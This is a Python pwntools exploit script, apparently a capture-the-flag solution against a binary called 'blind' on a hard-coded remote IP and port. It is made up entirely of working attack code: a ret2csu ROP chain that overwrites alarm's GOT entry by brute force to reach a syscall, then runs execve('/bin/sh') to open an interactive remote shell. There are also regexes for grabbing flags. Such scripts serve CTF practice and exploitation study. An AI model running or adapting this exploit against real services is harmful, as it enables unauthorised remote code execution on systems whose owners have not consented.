#encoding:utf-8
from pwn import *
import re

ip = '82.157.6.165'
port = 54000 
local = 0
filename = './blind'
libc_name = 'libc.so.6'
PREV_INUSE = 0x1
IS_MMAPPED = 0x2
NON_MAIN_ARENA = 0x4

def create_connect():
	global io, elf, libc, libc_name

	elf = ELF(filename)
	context(os=elf.os, arch=elf.arch, log_level=1)
	
	if local:
		io = process(filename)
		if elf.arch == 'amd64':
			libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
		elif elf.arch == 'i386':
			libc_name = '/lib/i386-linux-gnu/libc.so.6'
	else:
		io = remote(ip, port)
	try:
		libc = ELF(libc_name)
	except:
		pass

cc = lambda : create_connect()
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
g = lambda x: gdb.attach(io, x)

r = lambda : io.recv(timeout=1)
rr = lambda x: io.recv(x, timeout=1)
rl = lambda : io.recvline(keepends=False)
ru = lambda x : io.recvuntil(x)
ra = lambda : io.recvall(timeout=1)
it = lambda : io.interactive()
cl = lambda : io.close()

def regexp_out(data):
    patterns = [
        re.compile(r'(flag{.*?})'),
        re.compile(r'xnuca{(.*?)}'),
        re.compile(r'DASCTF{(.*?)}'),
        re.compile(r'WMCTF{.*?}'),
        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
    ]

    for pattern in patterns:
        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)
        if len(res) > 0:
            return str(res[0])

    return None

def pwn():
	'''
	.text:00000000004007A0 loc_4007A0:                             ; CODE XREF: init+54↓j
	.text:00000000004007A0                 mov     rdx, r13
	.text:00000000004007A3                 mov     rsi, r14
	.text:00000000004007A6                 mov     edi, r15d
	.text:00000000004007A9                 call    qword ptr [r12+rbx*8]
	.text:00000000004007AD                 add     rbx, 1
	.text:00000000004007B1                 cmp     rbx, rbp
	.text:00000000004007B4                 jnz     short loc_4007A0
	.text:00000000004007B6
	.text:00000000004007B6 loc_4007B6:                             ; CODE XREF: init+34↑j
	.text:00000000004007B6                 add     rsp, 8
	.text:00000000004007BA                 pop     rbx
	.text:00000000004007BB                 pop     rbp
	.text:00000000004007BC                 pop     r12
	.text:00000000004007BE                 pop     r13
	.text:00000000004007C0                 pop     r14
	.text:00000000004007C2                 pop     r15
	.text:00000000004007C4                 retn
	'''

	#g('b *0x400753\nb *0x4007A9')
	for i in range(56,256):
		cc()

		pop = 0x4007BA
		call = 0x4007A0
		read_got = elf.got['read']
		read_plt = elf.plt['read']
		alarm_got = elf.got['alarm']
		main_addr = 0x4005C0
		binsh_addr = 0x601040

		poc = b'A'*0x58
		
		poc += p64(pop)
		poc += p64(0)
		poc += p64(1)
		poc += p64(read_got)
		poc += p64(1)
		poc += p64(alarm_got)
		poc += p64(0)
		poc += p64(call)
		poc += b'A'*56

		poc += p64(pop)
		poc += p64(0)
		poc += p64(1)
		poc += p64(read_got)
		poc += p64(constants.SYS_execve)
		poc += p64(binsh_addr)
		poc += p64(0)
		poc += p64(call)
		poc += b'A'*56

		poc += p64(pop)
		poc += p64(0)
		poc += p64(1)
		poc += p64(alarm_got)
		poc += p64(0)
		poc += p64(0)
		poc += p64(binsh_addr)
		poc += p64(call)
		poc += b'A'*56
		sleep(3)
		s(poc)
		sleep(0.5)
		s(p8(i))
		sleep(0.5)
		s(b'/bin/sh\x00'.ljust(constants.SYS_execve, b'\x00'))
		try:
			r()
			it()
			break
		except:
			cl()
			continue

if __name__ == '__main__':
	pwn()